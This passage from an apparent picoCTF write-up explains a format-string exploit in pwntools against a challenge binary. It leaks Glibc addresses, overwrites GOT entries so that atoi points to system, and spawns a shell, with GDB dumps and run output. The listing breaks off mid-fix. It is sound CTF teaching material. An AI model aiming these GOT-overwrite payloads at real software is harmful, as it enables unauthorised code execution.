</code></pre></div><p>If we run it, GDB will attach to it, break at <code>pow</code> and then show the GOT:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef‚û§</span>  got

GOT protection: Partial RelRO | GOT functions: 9

[0x601018] <span class="code-dark-green">puts@GLIBC_2.2.5  ‚Üí  0x7f4c7b0845a0</span>
[0x601020] <span class="code-dark-yellow">__stack_chk_fail@GLIBC_2.4  ‚Üí  0x4006d6</span>  
[0x601028] <span class="code-dark-green">setbuf@GLIBC_2.2.5  ‚Üí  0x7f4c7b08bc50</span>
[0x601030] <span class="code-dark-green">printf@GLIBC_2.2.5  ‚Üí  0x7f4c7b061e10</span>
[0x601038] <span class="code-dark-green">snprintf@GLIBC_2.2.5  ‚Üí  0x7f4c7b061ee0</span>
[0x601040] <span class="code-dark-green">pow@GLIBC_2.2.5  ‚Üí  0x28</span>
[0x601048] <span class="code-dark-green">strcspn@GLIBC_2.2.5  ‚Üí  0x7f4c7b1837b0</span>
[0x601050] <span class="code-dark-green">read@GLIBC_2.2.5  ‚Üí  0x7f4c7b10e130</span>
[0x601058] <span class="code-dark-green">atoi@GLIBC_2.2.5  ‚Üí  0x7f4c7b044730</span>
</code></pre></div><h3 id="manual-exploitation">Manual exploitation</h3><p>The entry for <code>pow</code> has changed to <code>0x28</code> (40). This means that until the <code>%11$n</code>, we have printed 40 bytes. Since we have only <code>1.</code> before <code>%11$n</code>, this means that there are 38 bytes in the stack before. If we put <code>1..</code>, then the GOT entry would change to <code>0x29</code>, and so on.</p><p>At this moment, we need to enter the address of <code>main</code> (<code>0x400837</code>, which is 4196407 in decimal) in the GOT entry. However, we cannot introduce this number of bytes because it is too large.</p><p>But we can make use of another format string. Since the address we need to be written is 4196407, then we must print 4196407 - 38 - 2 = 4196367 bytes. And this can be done with a format string like <code>%4196367c</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">pow_got</span> <span class="mtk5">=</span> <span class="mtk7 mtki">0x</span><span class="mtk6">601040</span>
<span class="mtk1">payload_a</span> <span class="mtk5">=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'1234567.'</span> <span class="mtk5">+</span> <span class="mtk1">p64(</span><span class="mtk1">pow_got</span><span class="mtk1">)</span>  
<span class="mtk1">payload_b</span> <span class="mtk5">=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'1.</span><span class="mtk6">%4196367c</span><span class="mtk4">'</span> <span class="mtk5">+</span> <span class="mtk7 mtki">b</span><span class="mtk4">'%11$n'</span>

<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'A:</span> <span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk1">payload_a</span><span class="mtk1">)</span>
<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'B:</span> <span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk1">payload_b</span><span class="mtk1">)</span>

<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
</code></pre></div><p>The computation of the number of bytes to write can be done as follows:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">pow_got</span> <span class="mtk5">=</span> <span class="mtk7 mtki">0x</span><span class="mtk6">601040</span>
<span class="mtk1">bytes_on_stack</span> <span class="mtk5">=</span> <span class="mtk6">38</span>
<span class="mtk1">bytes_to_print</span> <span class="mtk5">=</span> <span class="mtk1">main_addr</span> <span class="mtk5">-</span> <span class="mtk1">bytes_on_stack</span> <span class="mtk5">-</span> <span class="mtk6">2</span>

<span class="mtk1">payload_a</span> <span class="mtk5">=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'1234567.'</span> <span class="mtk5">+</span> <span class="mtk1">p64(</span><span class="mtk1">pow_got</span><span class="mtk1">)</span>
<span class="mtk1">payload_b</span> <span class="mtk5">=</span> <span class="mtk7 mtki">f</span><span class="mtk4">'1.%</span><span class="mtk6">{</span><span class="mtk1">bytes_to_print</span><span class="mtk6">}</span><span class="mtk4">c'</span><span class="mtk1">.</span><span class="mtk8">encode</span><span class="mtk1">()</span> <span class="mtk5">+</span> <span class="mtk7 mtki">b</span><span class="mtk4">'%11$n'</span>  
</code></pre></div><p>And it works, we have converted <code>pow</code> into <code>main</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-green">+</span>] Starting local process './chall': pid 389440  
[<span class="code-blue">*</span>] Switching to interactive mode
Welcome to Fermat\'s Last Theorem as a service
A: <span class="code-red">$</span> 1
B: <span class="code-red">$</span> 1
Calculating for A: 1 and B: 1
Welcome to Fermat\'s Last Theorem as a service
A: <span class="code-red">$</span> 1
B: <span class="code-red">$</span> 1
Calculating for A: 1 and B: 1
Welcome to Fermat\'s Last Theorem as a service
A: <span class="code-red">$</span>
</code></pre></div><p>Now we have more chances to continue with the exploitation. Next, we must leak an address of Glibc to obtain its version. The purpose of this is calculate the real address of <code>system</code> and overwrite the GOT again for the final stage.</p><h3 id="obtaining-memory-leaks">Obtaining memory leaks</h3><p>To leak an address we can use the Format String vulnerability. For that, we must call <code>printf</code> with a <code>%s</code> format (strings in C are given as pointers) and pass a GOT entry (for example, <code>puts</code>), so that the value inside the GOT entry is printed (it works like a pointer).</p><p>The strategy is similar: we will use the <code>A</code> input to store the address of the GOT entry for <code>puts</code>. And then we will put <code>%11$s</code> in the <code>B</code> input:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">puts_got</span> <span class="mtk5">=</span> <span class="mtk7 mtki">0x</span><span class="mtk6">601018</span>
<span class="mtk1">payload_a</span> <span class="mtk5">=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'1234567.'</span> <span class="mtk5">+</span> <span class="mtk1">p64(</span><span class="mtk1">puts_got</span><span class="mtk1">)</span>
<span class="mtk1">payload_b</span> <span class="mtk5">=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'1.%11$s'</span>

<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'A:</span> <span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk1">payload_a</span><span class="mtk1">)</span>
<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'B:</span> <span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk1">payload_b</span><span class="mtk1">)</span>
<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'B:</span> <span class="mtk4">1.'</span><span class="mtk1">)</span>

<span class="mtk1">puts_addr</span> <span class="mtk5">=</span> <span class="mtk1">u64(</span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">().</span><span class="mtk8">strip</span><span class="mtk1">().</span><span class="mtk8">ljust</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">,</span> <span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">))</span>
<span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Leaked</span> <span class="mtk4">puts()</span> <span class="mtk4">address:</span> <span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">puts_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>  
</code></pre></div><p>After that, we can compute the base address of Glibc, knowing the offset of <code>puts</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ldd</span> <span class="mtku">chall</span>
        linux-vdso.so.1 (0x00007ffda1df7000)
        libm.so.6 => /lib/x86_64-linux-gnu/libm.so.6 (0x00007f576d29c000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f576d0aa000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f576d3fe000)

<span class="code-cyan">$</span> <span class="code-dark-green">readelf</span> -s <span class="mtku">/lib/x86_64-linux-gnu/libc.so.6</span> | <span class="code-dark-green">grep</span> puts
   194: 00000000000875a0   476 FUNC    GLOBAL DEFAULT   16 _IO_<span class="code-red">puts</span>@@GLIBC_2.2.5
   429: 00000000000875a0   476 FUNC    WEAK   DEFAULT   16 <span class="code-red">puts</span>@@GLIBC_2.2.5
   504: 00000000001273c0  1268 FUNC    GLOBAL DEFAULT   16 <span class="code-red">puts</span>pent@@GLIBC_2.2.5
   690: 0000000000129090   728 FUNC    GLOBAL DEFAULT   16 <span class="code-red">puts</span>gent@@GLIBC_2.10
  1158: 0000000000085e60   384 FUNC    WEAK   DEFAULT   16 f<span class="code-red">puts</span>@@GLIBC_2.2.5
  1705: 0000000000085e60   384 FUNC    GLOBAL DEFAULT   16 _IO_f<span class="code-red">puts</span>@@GLIBC_2.2.5
  2342: 00000000000914a0   159 FUNC    WEAK   DEFAULT   16 f<span class="code-red">puts</span>_unlocked@@GLIBC_2.2.5  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">puts_offset</span> <span class="mtk5">=</span> <span class="mtk7 mtki">0x</span><span class="mtk6">875a0</span>
<span class="mtk1">glibc_base_addr</span> <span class="mtk5">=</span> <span class="mtk1">puts_addr</span> <span class="mtk5">-</span> <span class="mtk1">puts_offset</span>
<span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Glibc</span> <span class="mtk4">base</span> <span class="mtk4">address:</span> <span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">glibc_base_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>  
</code></pre></div><p>And with all these, we have leaked the address of <code>puts</code> and the base address of Glibc:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-green">+</span>] Starting local process './chall': pid 414163  
[<span class="code-green">+</span>] Leaked puts() address: 0x7f4a695695a0
[<span class="code-green">+</span>] Glibc base address: 0x7f4a694e2000
[<span class="code-blue">*</span>] Switching to interactive mode
Welcome to Fermat\'s Last Theorem as a service
A: <span class="code-red">$</span>
</code></pre></div><p>Now we can search for the offset of <code>system</code> inside Glibc using:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">readelf</span> -s <span class="mtku">/lib/x86_64-linux-gnu/libc.so.6</span> | <span class="code-dark-green">grep</span> system
   236: 0000000000156a80   103 FUNC    GLOBAL DEFAULT   16 svcerr_<span class="code-red">system</span>err@@GLIBC_2.2.5  
   617: 0000000000055410    45 FUNC    GLOBAL DEFAULT   16 __libc_<span class="code-red">system</span>@@GLIBC_PRIVATE
  1427: 0000000000055410    45 FUNC    WEAK   DEFAULT   16 <span class="code-red">system</span>@@GLIBC_2.2.5
</code></pre></div><p>The idea is to modify the GOT entry of a function that takes a controlled string as first argument so that it points to <code>system</code>. For example, some candidates are <code>atoi</code> and <code>strcspn</code>. This time, we will be using <code>atoi</code>, whose GOT entry address is <code>0x601058</code>.</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">atoi_got</span> <span class="mtk5">=</span> <span class="mtk7 mtki">0x</span><span class="mtk6">601058</span>

<span class="mtk1">system_offset</span> <span class="mtk5">=</span> <span class="mtk7 mtki">0x</span><span class="mtk6">55410</span>
<span class="mtk1">system_addr</span> <span class="mtk5">=</span> <span class="mtk1">glibc_base_addr</span> <span class="mtk5">+</span> <span class="mtk1">system_offset</span>  
</code></pre></div><h3 id="got-overwrite">GOT overwrite</h3><p>Now we must write the real address of <code>system</code> to the GOT entry of <code>atoi</code>. Let&rsquo;s enter 0 bytes and see the value in the GOT using GDB as before:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">payload_a</span> <span class="mtk5">=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'1234567.'</span> <span class="mtk5">+</span> <span class="mtk1">p64(</span><span class="mtk1">pow_got</span><span class="mtk1">)</span>
<span class="mtk1">payload_b</span> <span class="mtk5">=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'1.%11$n'</span>

<span class="mtk8 mtku">gdb</span><span class="mtk1">.</span><span class="mtk8">attach</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">,</span> <span class="mtk9 mtki">gdbscript</span><span class="mtk5">=</span><span class="mtk4">'break</span> <span class="mtk4">atoi</span><span class="mtk6">\n</span><span class="mtk4">continue</span><span class="mtk6">\n</span><span class="mtk4">got'</span><span class="mtk1">)</span>  

<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'A:</span> <span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk1">payload_a</span><span class="mtk1">)</span>
<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'B:</span> <span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk1">payload_b</span><span class="mtk1">)</span>

<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
</code></pre></div><p>If we run it, GDB will attach to it, break at <code>atoi</code> and then show the GOT:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef‚û§</span>  got

GOT protection: Partial RelRO | GOT functions: 9

[0x601018] <span class="code-dark-green">puts@GLIBC_2.2.5  ‚Üí  0x7f660b8465a0</span>
[0x601020] <span class="code-dark-yellow">__stack_chk_fail@GLIBC_2.4  ‚Üí  0x4006d6</span>  
[0x601028] <span class="code-dark-green">setbuf@GLIBC_2.2.5  ‚Üí  0x7f660b84dc50</span>
[0x601030] <span class="code-dark-green">printf@GLIBC_2.2.5  ‚Üí  0x7f660b823e10</span>
[0x601038] <span class="code-dark-green">snprintf@GLIBC_2.2.5  ‚Üí  0x7f660b823ee0</span>
[0x601040] <span class="code-dark-green">pow@GLIBC_2.2.5  ‚Üí  0x400837</span>
[0x601048] <span class="code-dark-green">strcspn@GLIBC_2.2.5  ‚Üí  0x7f660b9457b0</span>
[0x601050] <span class="code-dark-green">read@GLIBC_2.2.5  ‚Üí  0x7f660b8d0130</span>
[0x601058] <span class="code-dark-green">atoi@GLIBC_2.2.5  ‚Üí  0x7f6600000028</span>
</code></pre></div><p>As it is shown, the entry for <code>atoi</code> has a value of <code>0x7f6600000028</code>. With <code>%11$n</code> we have overwritten the last 4 bytes (namely, <code>0x00000028</code>). Using the same procedure as before, we need to write a lot of bytes. The number of bytes to be entered in the format string can be computed as:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">bytes_on_stack</span> <span class="mtk5">=</span> <span class="mtk6">38</span>
<span class="mtk1">bytes_to_print</span> <span class="mtk5">=</span> <span class="mtk1">(</span><span class="mtk1">system_addr</span> <span class="mtk5">-</span> <span class="mtk1">bytes_on_stack</span> <span class="mtk5">-</span> <span class="mtk6">2</span><span class="mtk1">)</span> <span class="mtk5">&amp;</span> <span class="mtk7 mtki">0x</span><span class="mtk6">ffffffff</span>  
</code></pre></div><p>We limit the number to 4 bytes just in case. And then we add it to the payload and send it:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">bytes_to_print</span> <span class="mtk5">=</span> <span class="mtk1">(</span><span class="mtk1">system_addr</span> <span class="mtk5">-</span> <span class="mtk1">bytes_on_stack</span> <span class="mtk5">-</span> <span class="mtk6">2</span><span class="mtk1">)</span> <span class="mtk5">&amp;</span> <span class="mtk7 mtki">0x</span><span class="mtk6">ffffffff</span>  

<span class="mtk1">payload_a</span> <span class="mtk5">=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'1234567.'</span> <span class="mtk5">+</span> <span class="mtk1">p64(</span><span class="mtk1">atoi_got</span><span class="mtk1">)</span> <span class="mtk5">+</span> <span class="mtk1">p64(</span><span class="mtk1">atoi_got</span> <span class="mtk5">+</span> <span class="mtk6">2</span><span class="mtk1">)</span>
<span class="mtk1">payload_b</span> <span class="mtk5">=</span> <span class="mtk7 mtki">f</span><span class="mtk4">'1.%</span><span class="mtk6">{</span><span class="mtk1">bytes_to_print</span><span class="mtk6">}</span><span class="mtk4">c'</span><span class="mtk1">.</span><span class="mtk8">encode</span><span class="mtk1">()</span> <span class="mtk5">+</span> <span class="mtk7 mtki">b</span><span class="mtk4">'%11$n'</span>

<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'A:</span> <span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk1">payload_a</span><span class="mtk1">)</span>
<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'B:</span> <span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk1">payload_b</span><span class="mtk1">)</span>
<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">()</span>

<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
</code></pre></div><p>If everything is correct, the GOT entry for <code>atoi</code> will be pointing to <code>system</code>. An thus, we can enter <code>/bin/sh</code> in <code>A</code> or <code>B</code> inputs to get a shell:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-green">+</span>] Starting local process './chall': pid 502833  
[<span class="code-green">+</span>] Leaked puts() address: 0x7f4a096565a0
[<span class="code-green">+</span>] Glibc base address: 0x7f4a095cf000
[<span class="code-blue">*</span>] Switching to interactive mode
Welcome to Fermat\'s Last Theorem as a service
A: <span class="code-red">$</span> /bin/sh
B: <span class="code-red">$</span>
<span class="code-red">$</span> ls
chall  chall.c    Dockerfile  solve.py
</code></pre></div><p>Alright. Let&rsquo;s tweak the exploit a little bit to spawn a shell automatically:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'A:</span> <span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk7 mtki">b</span><span class="mtk4">'/bin/sh'</span><span class="mtk1">)</span>  
<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'B:</span> <span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk7 mtki">b</span><span class="mtk4">''</span><span class="mtk1">)</span>

<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'B:</span> <span class="mtk4">'</span><span class="mtk1">)</span>
<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendline</span><span class="mtk1">()</span>

<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-green">+</span>] Starting local process './chall': pid 507100  
[<span class="code-green">+</span>] Leaked puts() address: 0x7f6218d5b5a0
[<span class="code-green">+</span>] Glibc base address: 0x7f6218cd4000
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> ls
chall  chall.c    Dockerfile  solve.py
</code></pre></div><h3 id="finding-the-remote-glibc-version">Finding the remote Glibc version</h3><p>However, we are not done yet. We must execute the exploit on the remote instance and get the version of Glibc. After that, we must update all the offsets.</p><p>To help with the version lookup, we can leak more function addresses of Glibc. For that, I decided to build a function called <code>leak_address</code> as follows:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span> <span class="mtk8">leak_address</span><span class="mtk1">(</span><span class="mtk9 mtki">got_entry</span><span class="mtk1">:</span> <span class="mtk8 mtku">int</span><span class="mtk1">)</span> <span class="mtk1">-&gt;</span> <span class="mtk8 mtku">int</span><span class="mtk1">:</span>
    <span class="mtk1">payload_a</span> <span class="mtk5">=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'1234567.'</span> <span class="mtk5">+</span> <span class="mtk1">p64(</span><span class="mtk9 mtki">got_entry</span><span class="mtk1">)</span>
    <span class="mtk1">payload_b</span> <span class="mtk5">=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'1.%11$s'</span>

    <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'A:</span> <span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk1">payload_a</span><span class="mtk1">)</span>
    <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'B:</span> <span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk1">payload_b</span><span class="mtk1">)</span>
    <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'B:</span> <span class="mtk4">1.'</span><span class="mtk1">)</span>

    <span class="mtk5">return</span> <span class="mtk1">u64(</span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">().</span><span class="mtk8">strip</span><span class="mtk1">().</span><span class="mtk8">ljust</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">,</span> <span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">))</span>  
</code></pre></div><p>So that it is used this way:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">atoi_got</span> <span class="mtk5">=</span> <span class="mtk7 mtki">0x</span><span class="mtk6">601058</span>
<span class="mtk1">atoi_addr</span> <span class="mtk5">=</span> <span class="mtk8">leak_address</span><span class="mtk1">(</span><span class="mtk1">atoi_got</span><span class="mtk1">)</span>
<span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Leaked</span> <span class="mtk4">atoi()</span> <span class="mtk4">address:</span> <span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">atoi_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>  

<span class="mtk1">puts_got</span> <span class="mtk5">=</span> <span class="mtk7 mtki">0x</span><span class="mtk6">601018</span>
<span class="mtk1">puts_addr</span> <span class="mtk5">=</span> <span class="mtk8">leak_address</span><span class="mtk1">(</span><span class="mtk1">puts_got</span><span class="mtk1">)</span>
<span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Leaked</span> <span class="mtk4">puts()</span> <span class="mtk4">address:</span> <span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">puts_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>
</code></pre></div><p>We run the exploit remotely and it does not work. No problem for the moment. Let&rsquo;s check the leaked addresses:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> mars.picoctf.net 31929
[<span class="code-green">+</span>] Opening connection to mars.picoctf.net on port 31929: Done  
[<span class="code-green">+</span>] Leaked atoi() address: 0x7f026a26c730
[<span class="code-green">+</span>] Leaked puts() address: 0x7f026a2ac5a0
[<span class="code-green">+</span>] Glibc base address: 0x7f026a225000
</code></pre></div><p>These are the Glibc versions found (their offsets are all the same):</p><p><img src="/images/picoCTF/fermat-strings-libc.png" alt="Glibc Version"></p><p>We notice that the version of Glibc in the remote instance is the same that we were using locally.</p><p>However, the last stage of the exploit is not working remotely. This might be happening because we are writing a large amount of bytes in order to use <code>%n</code>. A more elegant way is using <code>%hhn</code> to write a single byte or <code>%hn</code> to write 2 bytes.</p><h3 id="fixing-the-exploit">Fixing the exploit</h3><p>Let&rsquo;s modify our payload to have a more stable exploit. For the moment we will be using <code>%hn</code>. The last 2 bytes of the GOT entry can be overwritten in a similar way as before, just a few modifications:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">bytes_to_print</span> <span class="mtk5">=</span> <span class="mtk1">((</span><span class="mtk1">system_addr</span> <span class="mtk5">&amp;</span> <span class="mtk7 mtki">0x</span><span class="mtk6">ffff</span><span class="mtk1">)</span> <span class="mtk5">-</span> <span class="mtk1">bytes_on_stack</span> <span class="mtk5">-</span> <span class="mtk6">2</span><span class="mtk1">)</span> <span class="mtk5">%</span> <span class="mtk7 mtki">0x</span><span class="mtk6">ffff</span>  

<span class="mtk1">payload_a</span> <span class="mtk5">=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'1234567.'</span> <span class="mtk5">+</span> <span class="mtk1">p64(</span><span class="mtk1">atoi_got</span><span class="mtk1">)</span> <span class="mtk5">+</span> <span class="mtk1">p64(</span><span class="mtk1">atoi_got</span> <span class="mtk5">+</span> <span class="mtk6">2</span><span class="mtk1">)</span>
<span class="mtk1">payload_b</span> <span class="mtk5">=</span> <span class="mtk7 mtki">f</span><span class="mtk4">'1.%</span><span class="mtk6">{</span><span class="mtk1">bytes_to_print</span><span class="mtk6">}</span><span class="mtk4">c'</span><span class="mtk1">.</span><span class="mtk8">encode</span><span class="mtk1">()</span> <span class="mtk5">+</span> <span class="mtk7 mtki">b</span><span class="mtk4">'%11$hn'</span>

<span class="mtk1">payload_b</span> <span class="mtk5">+=</span> <span class="mtk7 mtki">f</span><span class="mtk4">'%12$hn'</span><span class="mtk1">.</span><span class="mtk8">encode</span><span class="mtk1">()</span>

<span class="mtk8 mtku">gdb</span><span class="mtk1">.</span><span class="mtk8">attach</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">,</span> <span class="mtk9 mtki">gdbscript</span><span class="mtk5">=</span><span class="mtk4">'break</span> <span class="mtk4">atoi</span><span class="mtk6">\n</span><span class="mtk4">continue</span><span class="mtk6">\n</span><span class="mtk4">continue</span><span class="mtk6">\n</span><span class="mtk4">continue</span><span class="mtk6">\n</span><span class="mtk4">got'</span><span class="mtk1">)</span>

<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'A:</span> <span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk1">payload_a</span><span class="mtk1">)</span>
